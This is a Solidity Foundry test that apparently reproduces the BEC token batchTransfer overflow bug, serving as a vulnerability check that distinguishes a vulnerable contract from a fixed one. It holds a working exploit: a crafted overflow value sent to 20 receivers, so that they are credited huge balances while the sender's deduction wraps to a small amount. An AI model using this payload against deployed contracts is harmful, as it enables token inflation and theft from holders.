// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BECToken.sol";

contract BecTokenBatchTransferOverflowTest is Test {
    BecToken token;
    address[] receivers;

    address deployer = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.startPrank(deployer);
        token = new BecToken();
        vm.stopPrank();

        // Initialize 20 receivers
        receivers = new address[](20);
        for (uint160 i = 0; i < 20; i++) {
            receivers[i] = address(i + 100);
        }

        // Fund attacker with reasonable tokens
        vm.prank(deployer);
        token.transfer(attacker, 1000 * (10**18));
    }

    function test_BatchTransferOverflow() public {
        // Calculate malicious value to cause overflow: (max_uint256 / 20) + 1
        uint256 maliciousValue = type(uint256).max / 20 + 1;

        console2.log("--- BEFORE-Trigger Balances ---");
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        console2.log("Attacker balance:", attackerBalanceBefore);
        
        uint256[] memory receiversBalancesBefore = new uint256[](20);
        for (uint256 i = 0; i < 20; i++) {
            receiversBalancesBefore[i] = token.balanceOf(receivers[i]);
            console2.log("Receiver %s balance: %s", i, receiversBalancesBefore[i]);
        }

        console2.log("--- Trigger batchTransfer ---");
        bool success;
        bytes memory data;
        vm.prank(attacker);
        (success, data) = address(token).call(
            abi.encodeWithSignature(
                "batchTransfer(address[],uint256)",
                receivers,
                maliciousValue
            )
        );

        console2.log("--- AFTER-Trigger Balances ---");
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        console2.log("Attacker balance:", attackerBalanceAfter);
        
        uint256[] memory receiversBalancesAfter = new uint256[](20);
        for (uint256 i = 0; i < 20; i++) {
            receiversBalancesAfter[i] = token.balanceOf(receivers[i]);
            console2.log("Receiver %s balance: %s", i, receiversBalancesAfter[i]);
        }

        console2.log("--- Result Analysis ---");
        string memory verdict;
        if (success) {
            // Compute expected overflow amount for differential check
            uint256 expectedAttackerAmount;
            unchecked { expectedAttackerAmount = maliciousValue * 20; }
            
            bool receiversAllMatch = true;
            for (uint256 i = 0; i < 20; i++) {
                if (receiversBalancesAfter[i] != receiversBalancesBefore[i] + maliciousValue) {
                    receiversAllMatch = false;
                    break;
                }
            }
            
            uint256 attackerBalanceDiff = attackerBalanceBefore - attackerBalanceAfter;
            if (receiversAllMatch && attackerBalanceDiff == expectedAttackerAmount) {
                verdict = "Vulnerability Exists: Batch transfer overflow exploited - All state changes match expected vulnerabilities";
                console2.log(verdict);
            } else {
                verdict = "Vulnerability not Exist: State changes incomplete or inconsistent";
                console2.log(verdict);
            }
        } else {
            verdict = "Vulnerability not Exist: Transaction reverted as expected in fixed contract";
            console2.log(verdict);
        }
        
        // Final printed verdict
        console2.log(verdict);
    }
}